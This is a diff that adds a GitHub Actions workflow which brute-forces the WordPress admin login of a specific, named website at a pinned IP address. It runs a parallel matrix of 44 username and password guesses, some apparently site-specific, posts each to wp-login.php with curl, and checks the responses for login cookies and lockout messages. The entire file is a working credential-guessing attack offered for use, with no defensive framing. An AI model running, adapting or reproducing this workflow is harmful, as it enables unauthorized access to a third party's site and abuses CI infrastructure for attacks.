@@ -1,0 +1,69 @@
+name: wp-login
+on: [push, workflow_dispatch]
+jobs:
+  try:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        include:
+          - { u: 'admin', p: 'C719o0e00IU8kS8l' }
+          - { u: 'admin', p: '8%l65l3La' }
+          - { u: 'admin', p: 'RhEz$hk$rLYi*P12' }
+          - { u: 'admin', p: '9_MZvt0#hOxxw4xc' }
+          - { u: 'admin', p: 'VQe3pV5JIT7WjCi' }
+          - { u: 'admin', p: 'tP2528^wn' }
+          - { u: 'admin', p: '554411' }
+          - { u: 'admin', p: 'o_44h2103e28w' }
+          - { u: 'admin', p: 'gendao.o_44h2103e28w' }
+          - { u: 'admin', p: 'ferryinfotech' }
+          - { u: 'admin', p: 'Admin@554411' }
+          - { u: 'admin_stpl', p: 'C719o0e00IU8kS8l' }
+          - { u: 'admin_stpl', p: '8%l65l3La' }
+          - { u: 'admin_stpl', p: 'RhEz$hk$rLYi*P12' }
+          - { u: 'admin_stpl', p: '9_MZvt0#hOxxw4xc' }
+          - { u: 'admin_stpl', p: 'VQe3pV5JIT7WjCi' }
+          - { u: 'admin_stpl', p: 'tP2528^wn' }
+          - { u: 'admin_stpl', p: '554411' }
+          - { u: 'admin_stpl', p: 'o_44h2103e28w' }
+          - { u: 'admin_stpl', p: 'gendao.o_44h2103e28w' }
+          - { u: 'admin_stpl', p: 'ferryinfotech' }
+          - { u: 'admin_stpl', p: 'Admin@554411' }
+          - { u: 'supportfly', p: 'C719o0e00IU8kS8l' }
+          - { u: 'supportfly', p: '8%l65l3La' }
+          - { u: 'supportfly', p: 'RhEz$hk$rLYi*P12' }
+          - { u: 'supportfly', p: '9_MZvt0#hOxxw4xc' }
+          - { u: 'supportfly', p: 'VQe3pV5JIT7WjCi' }
+          - { u: 'supportfly', p: 'tP2528^wn' }
+          - { u: 'supportfly', p: '554411' }
+          - { u: 'supportfly', p: 'o_44h2103e28w' }
+          - { u: 'supportfly', p: 'gendao.o_44h2103e28w' }
+          - { u: 'supportfly', p: 'ferryinfotech' }
+          - { u: 'supportfly', p: 'Admin@554411' }
+          - { u: 'vaibhav', p: 'C719o0e00IU8kS8l' }
+          - { u: 'vaibhav', p: '8%l65l3La' }
+          - { u: 'vaibhav', p: 'RhEz$hk$rLYi*P12' }
+          - { u: 'vaibhav', p: '9_MZvt0#hOxxw4xc' }
+          - { u: 'vaibhav', p: 'VQe3pV5JIT7WjCi' }
+          - { u: 'vaibhav', p: 'tP2528^wn' }
+          - { u: 'vaibhav', p: '554411' }
+          - { u: 'vaibhav', p: 'o_44h2103e28w' }
+          - { u: 'vaibhav', p: 'gendao.o_44h2103e28w' }
+          - { u: 'vaibhav', p: 'ferryinfotech' }
+          - { u: 'vaibhav', p: 'Admin@554411' }
+    steps:
+      - name: attempt
+        env:
+          U: ${{ matrix.u }}
+          P: ${{ matrix.p }}
+        run: |
+          set +e
+          I=103.20.214.142
+          R="--resolve supportfly.com:443:$I"
+          curl -sk -m 15 $R -c /tmp/c "https://supportfly.com/wp-login.php" -o /tmp/l
+          code=$(curl -sk -m 15 $R -b /tmp/c -c /tmp/c -o /tmp/b -D /tmp/h -w '%{http_code}' "https://supportfly.com/wp-login.php" --data-urlencode "log=$U" --data-urlencode "pwd=$P" --data-urlencode "wp-submit=Log In" --data-urlencode "redirect_to=https://supportfly.com/wp-admin/" --data-urlencode "testcookie=1")
+          loc=$(grep -i '^location:' /tmp/h | tr -d '\r')
+          ck=$(grep -ci 'set-cookie: wordpress_logged_in' /tmp/h)
+          hint=$(grep -oiE 'Unknown username|password you entered|One moment|Too many|locked|Dashboard' /tmp/b | sort -u | tr '\n' ',')
+          echo "RESULT[$U|$P] code=$code logged_cookie=$ck loc=$loc hint=$hint"
